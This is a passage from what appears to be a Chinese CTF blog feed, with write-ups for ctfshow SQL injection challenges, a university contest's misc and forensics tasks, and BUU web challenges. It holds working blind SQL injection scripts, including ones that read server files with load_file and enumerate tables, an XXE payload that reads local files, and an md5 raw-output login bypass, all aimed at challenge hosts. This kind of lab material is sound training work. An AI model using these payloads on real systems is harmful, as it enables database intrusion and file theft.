class="line">&#125;</span><br></pre></td></tr></table></figure><p>翻译过来就是过滤了*，|，#，&#x3D;以及file、or、select、and、flag、into</p><p>借鉴了regexp注入脚本，虽然前面的是错误的，但是{}中的内容是正确的，<del>原理待探究</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b83cf405-f6f4-4ac3-8924-b588cb2efe81.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)limit(1)offset(0)where(substr(pass,<span class="subst">&#123;i&#125;</span>,1))regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web-184"><a href="#web-184" class="headerlink" title="web-184"></a>web-184</h2><h2 id="web-185"><a href="#web-185" class="headerlink" title="web-185"></a>web-185</h2><h2 id="web-186"><a href="#web-186" class="headerlink" title="web-186"></a>web-186</h2><h2 id="web-187"><a href="#web-187" class="headerlink" title="web-187"></a>web-187</h2><p>返回逻辑如下，看到对密码做了如下处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin可以获得flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不存在&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5()函数会将我们输入的值，加密，然后转换成16字符的二进制格式，由于ffifdyop被md5加密后的276f722736c95d99e921722cf9ed621c转换成16位原始二进制格式为’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c，这个字符串前几位刚好是’ or ‘6，所以账号密码为</p><p><code>$username = admin;</code><br><code>$password = ffifdyop;</code></p><h2 id="web-188"><a href="#web-188" class="headerlink" title="web-188"></a>web-188</h2><p>返回逻辑如下，可以看到用户名过滤了一堆，密码只能是数字并且得到的密码必须和密码一样是数字。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">          <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">          <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题触及到了知识盲区，刚看到的时候感觉完全摸不到头脑。</p><p>在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个where可以把所有以字母开头的数据查出来，比如：</p><img src="/posts/30170/web-188-1.jpg" alt="web-188-1" style="zoom: 150%;"><p>而让密码为0则是为了让<code>if($row[&#39;pass&#39;]==intval($password))</code>成立再次运用那个比较</p><h2 id="web-189"><a href="#web-189" class="headerlink" title="web-189"></a>web-189</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://fa9c0317-5e8e-446f-be0f-c64967458b42.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">250</span>,<span class="number">350</span>):</span><br><span class="line"><span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line"><span class="built_in">min</span>=<span class="number">32</span> </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">#time.sleep(0.2)</span></span><br><span class="line">middle=<span class="built_in">min</span>+((<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">min</span>==middle:</span><br><span class="line">flag+=<span class="built_in">chr</span>(middle)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">payload=<span class="string">&quot;if(ascii(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),%d,1))&lt;%d,1,0)&quot;</span>%(i,middle)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">r=requests.post(url,data=data).text</span><br><span class="line"><span class="comment">#print(r)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;\\u67e5\\u8be2\\u5931\\u8d25&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line"><span class="built_in">max</span>=middle</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">min</span>=middle</span><br></pre></td></tr></table></figure><p>可得php切片，包含flag</p><h2 id="web-190"><a href="#web-190" class="headerlink" title="web-190"></a>web-190</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d5a4bc3e-a1bf-460b-8499-a54d5c8b1e9e.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line"><span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line"><span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">#time.sleep(0.2)</span></span><br><span class="line">middle=<span class="built_in">min</span>+((<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">min</span>==middle:</span><br><span class="line">flag+=<span class="built_in">chr</span>(middle)</span><br><span class="line"><span class="keyword">if</span> middle == <span class="number">32</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment">#payload=&quot;admin&#x27; and if(ascii(substr(database(),%d,1))&lt;%d,1,0)=&#x27;1&quot;%(i,middle)</span></span><br><span class="line"><span class="comment">#ctfshow_web</span></span><br><span class="line"><span class="comment">#payload=&quot;admin&#x27; and if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctfshow_web&#x27;)),%d,1))&lt;%d,1,0)=&#x27;1&quot;%(i,middle)</span></span><br><span class="line"><span class="comment">#ctfshow_fl0g,ctfshow_user</span></span><br><span class="line"><span class="comment">#payload=&quot;admin&#x27; and if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;ctfshow_fl0g&#x27;)),%d,1))&lt;%d,1,0)=&#x27;1&quot;%(i,middle)</span></span><br><span class="line"><span class="comment">#id,f1ag</span></span><br><span class="line">payload=<span class="string">&quot;admin&#x27; and if(ascii(substr((select(group_concat(f1ag))from(ctfshow_fl0g)),%d,1))&lt;%d,1,0)=&#x27;1&quot;</span>%(i,middle)</span><br><span class="line"><span class="comment">#ctfshow&#123;30a68bc5-6488-4411-a820-2bf64d5fd7e3&#125;</span></span><br><span class="line">data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">r=requests.post(url,data=data).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line"><span class="built_in">max</span>=middle</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">min</span>=middle</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>新疆高校大学生信息安全大赛WP</title>
      <link href="/posts/56935/"/>
      <url>/posts/56935/</url>
      
        <content type="html"><![CDATA[<p>就是一个压缩包，里面有个流量包，追踪TCP流，有关键的一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(.Z.m.x.h.Z.3.t.i.c.2.N.6.c.z.F.6.Y.3.h.9.......................</span><br></pre></td></tr></table></figure><p>去掉闲杂符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tic2N6czF6Y3h9</span><br></pre></td></tr></table></figure><p>base64解密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bsczs1zcx&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="easyimage"><a href="#easyimage" class="headerlink" title="easyimage"></a>easyimage</h3><p>打开压缩包，里面是个png文件，010打开，文件头一团糟，按照格式修复它</p><p>参考下面的链接</p><blockquote><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865">【CTF杂项】常见文件文件头文件尾格式总结及各类文件头_iqiqiya的博客-CSDN博客_gif文件头</a></p><p><a href="https://www.cnblogs.com/0yst3r-2046/p/11890498.html">Bugku-CTF加密篇之zip伪加密（flag.zip） - 0yst3r - 博客园 (cnblogs.com)</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000h: 50 89-&gt;89 50</span><br><span class="line">B150h: 03 04-&gt;50 4B 03 04</span><br><span class="line">B150h: 14 03-&gt;14 00</span><br><span class="line">B1E0h: 3F 03-&gt;3F 00</span><br><span class="line">B1E0h: 14 03-&gt;14 00</span><br><span class="line">B230h: 05 06-&gt;50 4B 05 06</span><br></pre></td></tr></table></figure><p>之后binwalk分离得到一个压缩包，在爆破密码无果后将注意力放回图片，stegpy可得密码passw0rd@123</p><p>打开里面是奇怪的符号，可以得知是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">♐︎●︎♋︎♑︎❀︎⌧︎♐︎⬥︎⌘︎📫︎♐︎⬥︎⌧︎⬧︎📫︎♌︎□︎♓︎⌧︎📫︎♓︎♍︎⌧︎❑︎📫︎♐︎⌧︎⌘︎❖︎❝︎</span><br></pre></td></tr></table></figure><p>谷歌搜索得到：<a href="https://wingdingstranslator.com/">Wingdings Translator Online - Free Wingdings Converter Tool</a>，经过网站上的在线解密可得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xfwz-fwxs-boix-icxq-fxzv&#125;#你这答案设定错了</span><br></pre></td></tr></table></figure><h3 id="取证分析-HXD"><a href="#取证分析-HXD" class="headerlink" title="取证分析-HXD"></a>取证分析-HXD</h3><p>010打开，伪加密，把504B0102后面的全局加密标志的0900换成0000，之后解压出HXD,因为不知道是啥类型的文件，就放到binwalk里分解，除了ext，是个磁盘类似日志的东西，放在DiskGenius导入，恢复文件，拿到the key is ctf,hefi{bgu-jbg-vcz-sey-h23-123c}，维吉尼亚可解。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Buu-web第二页</title>
      <link href="/posts/36064/"/>
      <url>/posts/36064/</url>
      
        <content type="html"><![CDATA[<h1 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake-XML-cookbook"></a>Fake-XML-cookbook</h1><h3 id="1、概览题目"><a href="#1、概览题目" class="headerlink" title="1、概览题目"></a>1、概览题目</h3><p>打开题目看到一个登录框，结合题目Fake XML cookbook，查找Xml有关的知识点</p><p><img src="/posts/36064/Fake-XML-cookbook_1.jpg" alt="1"></p><p><a href="https://www.cnblogs.com/tqing/p/11852412.html">CTF中关于XXE(XML外部实体注入)题目两道 - TQing - 博客园 (cnblogs.com)</a></p><p>将上述链接的例子研究过后，发现可以利用全局定义的实体进行将伪协议利用实体解析执行的一个效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;  ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;username&gt;</span><br><span class="line">        &amp;xxe;</span><br><span class="line">    &lt;/username&gt;</span><br><span class="line">    &lt;password&gt;</span><br><span class="line">        admin</span><br><span class="line">    &lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line">#可以看到它将xxe这个实体放入username 中使得上面定义的命令被执行，具体的原理可以看下面的链接</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/113822279?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-7.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-7.control">NCTF2019]Fake(True) XML cookbook———jarvisoj的API调用_Zero_Adam的博客-CSDN博客</a></p><h3 id="2、抓包注入"><a href="#2、抓包注入" class="headerlink" title="2、抓包注入"></a>2、抓包注入</h3><p>既然了解了他的原理，那就可以进行实际的操作。</p><p>先用BP抓包</p><p><img src="/posts/36064/Fake-XML-cookbook_2.jpg" alt="2"></p><p>从“1”可以看到是一个xml的类型，然后“2”的位置是我们输入的内容</p><h3 id="3、获取flag"><a href="#3、获取flag" class="headerlink" title="3、获取flag"></a>3、获取flag</h3><p>从前面的链接，我们可以执行伪协议进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [&lt;!ENTITY aaa SYSTEM &quot;file:///flag&quot;&gt;  ]&gt;#file伪协议读取文件</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;username&gt;</span><br><span class="line">        &amp;aaa;</span><br><span class="line">    &lt;/username&gt;</span><br><span class="line">    &lt;password&gt;</span><br><span class="line">        1111</span><br><span class="line">    &lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/36064/Fake-XML-cookbook_3.jpg" alt="3"> </p><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><h3 id="1、概览题目-1"><a href="#1、概览题目-1" class="headerlink" title="1、概览题目"></a>1、概览题目</h3><p><img src="/posts/36064/Pythonginx_1.jpg" alt="1"></p><p>可以看到是一个登录框和一大段的代码，整理一下可以得到大概的一个代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>():</span><br><span class="line">url = <span class="string">&quot;http://suctf.cc   &quot;</span></span><br><span class="line">host = parse.urlparse(url).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">parts = <span class="built_in">list</span>(parse.urlsplit(url))</span><br><span class="line">host = parts[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">newhost = []</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost) <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">finalUrl = parse.urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(finalUrl)</span><br><span class="line">host = parse.urlparse(finalUrl).hostname</span><br><span class="line"><span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span> </span><br></pre></td></tr></table></figure><h3 id="2、分析源码"><a href="#2、分析源码" class="headerlink" title="2、分析源码"></a>2、分析源码</h3><p>可以看到大概的意思是绕过前两个if，从而在第三个if中读取对应的文件</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-web第一页</title>
      <link href="/posts/58523/"/>
      <url>/posts/58523/</url>
      
        <content type="html"><![CDATA[<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><h3 id="1、查看隐藏页面"><a href="#1、查看隐藏页面" class="headerlink" title="1、查看隐藏页面"></a>1、查看隐藏页面</h3><p>F12打开可以看到source.php页面，打开可以看到php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2、审计代码"><a href="#2、审计代码" class="headerlink" title="2、审计代码"></a>2、审计代码</h3><h4 id="执行主体"><a href="#执行主体" class="headerlink" title="执行主体"></a>执行主体</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 